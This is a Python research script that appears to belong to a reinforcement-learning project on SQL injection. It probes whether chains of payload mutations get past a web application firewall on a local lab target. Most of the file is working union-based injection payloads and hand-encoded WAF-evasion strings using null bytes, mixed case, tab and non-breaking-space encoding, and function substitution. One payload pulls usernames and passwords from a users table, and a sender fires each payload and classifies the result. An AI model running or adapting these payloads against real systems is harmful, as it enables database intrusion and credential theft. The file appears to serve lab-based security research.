"""
tools/probe_bypass.py
=====================
Reachability probe: prove (or disprove) that the agent's OWN mutation
functions — applied in a given order — turn a corpus base payload into a
WAF bypass, going through the exact send_request + classify_response path
the RL env uses.

This is a sanity check, not training. It answers one question:
    "Is the union/error bypass reachable with the mutations we ship,
     and does ORDER matter?"

USAGE
-----
    python -m tools.probe_bypass --url http://localhost:8080/Less-1/ --param id

It runs, for one union base payload, a GOOD order and a BAD order and
prints each intermediate payload + the final classification, so you can
see exactly where the WAF blocks.
"""

from __future__ import annotations

import argparse

from seqsqli.core.mutations import MUTATIONS
from seqsqli.core.http import send_request
from seqsqli.core.response import classify_response
from seqsqli.builder import build_target_from_args


# A union base in the same shape as payloads_union_less1.csv (u0109).
UNION_BASE = "-1' UNION SELECT database(),'SEQSQLI_START','SEQSQLI_END'-- -"

# Hypothesis: null_byte MUST precede any space-replacement, otherwise the
# trailing '-- -' is rewritten to '--%0a-' and can no longer be stripped,
# leaving the WAF-blocked '--' in place.
GOOD_ORDER = ["null_byte", "case_split", "func_sp_nbsp", "newline"]
BAD_ORDER  = ["newline", "null_byte", "case_split", "func_sp_nbsp"]

# Complex-tier union bases (nested subquery → TWO SELECT keywords). These are
# rows 42-108 of payloads_union_less1.csv, the ones the trained policy fails
# on. Hypothesis: reachable with the SAME good order, BUT only when 'case'
# (global random_case) is used. 'case_split' rewrites only the FIRST SELECT,
# so the inner subquery's SELECT keeps exact case and trips rule 100010.
COMPLEX_BASES = [
    "-1' UNION SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),'SEQSQLI_START','SEQSQLI_END'-- -",
    "-1' UNION ALL SELECT (SELECT CONCAT(0x7c,GROUP_CONCAT(DISTINCT table_name),0x7c) FROM information_schema.tables WHERE table_schema=DATABASE()),'SEQSQLI_START','SEQSQLI_END'--+",
]
COMPLEX_CASE      = ["null_byte", "case", "tab_space", "func_sp_nbsp"]
COMPLEX_CASESPLIT = ["null_byte", "case_split", "tab_space", "func_sp_nbsp"]


def run_sequence(target, base: str, seq, *, signal_type="union",
                 error_function="", strict=True) -> None:
    payload = base
    print(f"  base: {payload}")
    for name in seq:
        mutated = MUTATIONS[name](payload)
        changed = "  (no-op)" if mutated == payload else ""
        payload = mutated
        print(f"   +{name:<14} -> {payload}{changed}")

    resp_text, status = send_request(target, payload)
    result = classify_response(
        resp_text, status,
        signal_type=signal_type,
        error_function=error_function,
        strict_markers=strict,
    )
    snippet = resp_text.replace("\n", " ")[:160]
    print(f"   RESULT: {result}  (HTTP {status})")
    print(f"   body  : {snippet}")
    print()


def run_final(target, label: str, payload: str, *, signal_type="union",
              error_function="", strict=True) -> None:
    """Send an ALREADY-mutated final payload verbatim (no mutation chain).

    Used to probe function-substitution candidates that have no mutation yet:
    we hand-build the final string and check (a) WAF pass and (b) SQL validity
    (markers reflect, no 'does not exist'/syntax error). This proves a target
    is reachable BEFORE we write a mutation for it.
    """
    resp_text, status = send_request(target, payload)
    result = classify_response(
        resp_text, status,
        signal_type=signal_type,
        error_function=error_function,
        strict_markers=strict,
    )
    low = resp_text.lower()
    sql_err = ("does not exist" in low or "you have an error" in low
               or "syntax" in low)
    waf = "BLOCKED(403)" if status == 403 else f"PASS({status})"
    verdict = "SUCCESS" if result == "SUCCESS" else (
        "SQL_BROKEN" if sql_err else result)
    print(f"  [{label}]")
    print(f"     payload : {payload}")
    print(f"     WAF={waf}  classify={result}  -> {verdict}")
    if sql_err:
        import re as _re
        m = _re.search(r'(FUNCTION[^<]*does not exist|you have an error[^<]*|[^<]*syntax[^<]*)',
                       resp_text, _re.IGNORECASE)
        if m:
            print(f"     sqlerr  : {m.group(1)[:120]}")
    print()


# Function-substitution candidates for the COMPLEX tier.
# Problem proven empirically: group_concat is a dead-end — NBSP/comment break
# rule 100021 but also break the SQL (MySQL treats grOuP_cOnCaT%a0( as a missing
# stored function); adjacent '(' is valid SQL but trips rule 100021. We need a
# DIFFERENT aggregate whose name does NOT match 'group_concat' and whose '('
# can stay adjacent (valid SQL) while still passing the WAF.
# Each entry is a FULLY-mutated final payload (case + %09 spaces + ;%00),
# differing only in which aggregate replaces GROUP_CONCAT.
_SUBST_PREFIX = "-1%27%09uNIoN%09sElEcT%09(sElEcT%09"
_SUBST_SUFFIX = ("(taBLe_name)%09frOm%09InfOrMATiOn_sChEmA.taBLes%09whErE%09"
                 "taBLe_schema=daTaBasE%a0())%2c%27SEQSQLI_START%27%2c"
                 "%27SEQSQLI_END%27;%00")
SUBST_CANDIDATES = {
    # json_arrayagg: MySQL 5.7.22+ built-in, no WAF rule, paren can stay adjacent
    "json_arrayagg":  "jSoN_aRRaYaGg",
}

# Hand-built FINAL payloads for the 3 real complex shapes in the corpus.
# All use json_arrayagg (replaces group_concat) + case + %09 + database%a0()
# + ;%00. Forms B and C additionally need hex (0x..) and (form C) FROM users
# handled. We hand-encode the *intended* fully-mutated result to prove each
# shape is reachable BEFORE writing/ordering mutations.
COMPLEX_FORMS = {
    # A) medium u0145: single-arg group_concat → json_arrayagg(table_name). PROVEN SUCCESS.
    "A medium (json_arrayagg, single-arg)":
        "-1%27%09uNIoN%09sElEcT%09(sElEcT%09jSoN_aRRaYaGg(taBLe_name)%09"
        "frOm%09InfOrMATiOn_sChEmA.taBLes%09whErE%09taBLe_schema=daTaBasE%a0())"
        "%2c%27SEQSQLI_START%27%2c%27SEQSQLI_END%27;%00",
    # B) complex u0193 multi-arg: json_arrayagg(CONCAT(...)) wraps the 3 args.
    #    hex 0x2e -> CHAR(46); NOT IN (0x..) -> NOT IN (CHAR(..)).
    "B complex multi-arg (json_arrayagg+CONCAT+CHAR)":
        "-1%27%09uNIoN%09sElEcT%09(sElEcT%09jSoN_aRRaYaGg(CoNcAt(taBLe_schema%2cCHAR(46)%2ctaBLe_name))%09"
        "frOm%09InfOrMATiOn_sChEmA.taBLes%09whErE%09taBLe_schema%09nOt%09In%09"
        "(CHAR(105%2c110%2c102%2c111%2c114%2c109%2c97%2c116%2c105%2c111%2c110%2c95%2c115%2c99%2c104%2c101%2c109%2c97)%2c"
        "CHAR(109%2c121%2c115%2c113%2c108)%2c"
        "CHAR(112%2c101%2c114%2c102%2c111%2c114%2c109%2c97%2c110%2c99%2c101%2c95%2c115%2c99%2c104%2c101%2c109%2c97)))"
        "%2c%27SEQSQLI_START%27%2c%27SEQSQLI_END%27;%00",
    # C) complex u0181 multi-arg + FROM users: + ident_backtick.
    "C complex multi-arg+FROM-users (json_arrayagg+CONCAT+CHAR+backtick)":
        "-1%27%09uNIoN%09sElEcT%09(sElEcT%09jSoN_aRRaYaGg(CoNcAt(uSeRnAmE%2cCHAR(58)%2cpAsSwOrD))%09"
        "frOm%09%60users%60)"
        "%2c%27SEQSQLI_START%27%2c%27SEQSQLI_END%27;%00",
    # D) complex u0205 DISTINCT inside outer CONCAT(0x7c, group_concat(DISTINCT x), 0x7c):
    #    drop DISTINCT, swap inner agg, hex 0x7c -> CHAR(124).
    "D complex DISTINCT (drop-DISTINCT + json_arrayagg + CHAR)":
        "-1%27%09uNIoN%09sElEcT%09(sElEcT%09CoNcAt(CHAR(124)%2cjSoN_aRRaYaGg(taBLe_name)%2cCHAR(124))%09"
        "frOm%09InfOrMATiOn_sChEmA.taBLes%09whErE%09taBLe_schema=daTaBasE%a0())"
        "%2c%27SEQSQLI_START%27%2c%27SEQSQLI_END%27;%00",
}


def main() -> None:
    ap = argparse.ArgumentParser(description="WAF bypass reachability probe.")
    ap.add_argument("--url", required=True)
    ap.add_argument("--param", default="id")
    ap.add_argument("--method", default="GET", choices=["GET", "POST"])
    args = ap.parse_args()

    target = build_target_from_args(args.url, args.param, args.method, None)

    print("=" * 68)
    print(" GOOD ORDER (null_byte first — hypothesis: SUCCESS)")
    print("=" * 68)
    run_sequence(target, UNION_BASE, GOOD_ORDER)

    print("=" * 68)
    print(" BAD ORDER (newline before null_byte — hypothesis: WAF_BLOCKED)")
    print("=" * 68)
    run_sequence(target, UNION_BASE, BAD_ORDER)

    print("#" * 68)
    print(" FUNCTION SUBSTITUTION PROBE (complex tier — group_concat dead-end)")
    print(" Control = group_concat (expected SQL_BROKEN via %a0).")
    print("#" * 68)
    run_final(target, "CONTROL group_concat%a0(",
              _SUBST_PREFIX + "grOuP_cOnCaT%a0" + _SUBST_SUFFIX)
    for fn_lower, fn_cased in SUBST_CANDIDATES.items():
        run_final(target, f"CANDIDATE {fn_lower}(",
                  _SUBST_PREFIX + fn_cased + _SUBST_SUFFIX)

    print("#" * 68)
    print(" ALL 3 COMPLEX FORMS (json_arrayagg + CHAR + backtick as needed)")
    print(" Goal: prove every corpus shape is reachable -> all SUCCESS.")
    print("#" * 68)
    for label, payload in COMPLEX_FORMS.items():
        run_final(target, label, payload)


if __name__ == "__main__":
    main()
